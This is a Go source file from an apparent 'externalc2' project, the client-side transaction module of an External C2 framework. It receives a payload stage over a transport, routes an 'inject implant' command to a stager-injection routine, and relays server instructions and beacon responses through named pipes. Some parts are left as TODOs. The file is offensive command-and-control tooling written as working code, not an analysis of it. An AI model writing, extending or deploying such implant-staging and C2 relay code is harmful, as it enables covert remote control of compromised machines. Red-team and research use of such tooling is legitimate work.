//go:build client && !server

package transaction

import (
	"log"

	"externalc2/pkg/component"
	"externalc2/pkg/exec"
	"externalc2/pkg/instructions"
	"externalc2/pkg/ipc"
	"externalc2/pkg/transport"
	"externalc2/pkg/utils/logging"
)

type initFrameArgs struct {
	Manifest component.ComponentManifest `json:"Manifest"`
}

func writeToChannel(channel chan []byte, data []byte) {
	channel <- data
}

func readFromChannel(channel chan []byte) []byte {
	data := <-channel
	return data
}

func readFromTransport(server transport.RegisteredComponent, clientComponent *component.Component) ([]byte, bool, error) {
	log.SetPrefix(logging.GetLogPrefix())
	data, boolSuccess, err := server.Transport.Recv(server.CmdChannel)
	if !boolSuccess {
		log.Println("failed to receive from channel: ", err)
		return data, false, err
	}
	return data, true, nil
}

func RouteInstruction(server *transport.RegisteredComponent, instruction instructions.ServerInstruction) {
	switch cmd := instruction.Cmd; cmd {
	case "ii": //inject implant
		// log.Println(instruction)
		exec.RouteCmd(server, instruction)
	case "rc": //relay command
		server = RelayInstruction(server, instruction)
	}
}

// Relays a Server instruction to a specified client, by converting the server instruction to a BeaconPipeMessage
func RelayInstruction(server *transport.RegisteredComponent, instruction instructions.ServerInstruction) *transport.RegisteredComponent {
	log.SetPrefix(logging.GetLogPrefix())
	// TODO: Convert instruction.ServerInstruction to a instruction.BeaconPipeMessage
	var clientInstruction instructions.BeaconPipeMessage
	go writeToChannel(server.CmdChannel, clientInstruction.MessageData)
	err := ipc.Write(clientInstruction.PipeName, server.CmdChannel)
	if err != nil {
		log.Println("failed to write to pipe: ", err)
		// TODO: Close pipe, notify controller and error out, and exit if this happens
		// handleClientExit(server)

	}
	log.Println("Relayed to client")
	return server
}

func RetrieveStage(server *component.Component, externalTransport transport.TransportMethod) (transport.RegisteredComponent, bool) {
	var serverInit transport.RegisteredComponent
	var stageInstruction instructions.ServerInstruction
	serverInit.CmdChannel = make(chan []byte)
	server.TransportChannel = &serverInit.CmdChannel
	data, boolSuccess, err := externalTransport.Recv(serverInit.CmdChannel)
	if !boolSuccess {
		log.Println("failed to receive from server channel: ", err)
		return serverInit, false
	}
	stageInstruction.Cmd = "ii"
	stageInstruction.FrameData = data
	RouteInstruction(&serverInit, stageInstruction) // route to the stager injection command
	metadata, err := ipc.Read(server.Config.Destination)
	go writeToChannel(serverInit.TransportChannel, []byte(metadata))
	boolSuccess, err = serverInit.Transport.Send(serverInit.TransportChannel)
	if !boolSuccess {
		log.Fatalln("failed to send instruction: ", err)
	}
	log.Println("New client registred. ID: ", server.ComponentId)
	return serverInit, true
	// NOTE: once we return here, we'll begin a sleep and RECV from the transport to see if we get a new instruction
}

func RetreiveClientResponse(server *component.Component, externalTransport transport.RegisteredComponent) (instructions.ServerInstruction, error) {
	var responseInstruction instructions.BeaconPipeMessage
	responseInstruction.PipeName = server.Config.Destination
	var serverInstruction instructions.ServerInstruction
	resp, err := ipc.Read(responseInstruction.PipeName)
	if err != nil {
		log.Fatalln("failed to read from client pipe: ") // TODO: Bad exit, notify server, shutdown
	}
	responseInstruction.MessageData = []byte(resp)
	go writeToChannel(externalTransport.TransportChannel, []byte(resp))
	boolSuccess, err := externalTransport.Transport.Send(externalTransport.TransportChannel)
	if !boolSuccess {
		log.Fatalln("failed to relay response: ", err)
	}
	log.Println("Relayed Response")
	// TODO: Convert beaconmessage into server instruction
	serverInstruction.Cmd = "cr" // client response
	serverInstruction.FrameData = responseInstruction.MessageData
	return serverInstruction, nil
}

// Sends a notification that we're dead to the server. Kills the client
// func handleClientExit(server *transport.RegisteredComponent) { }
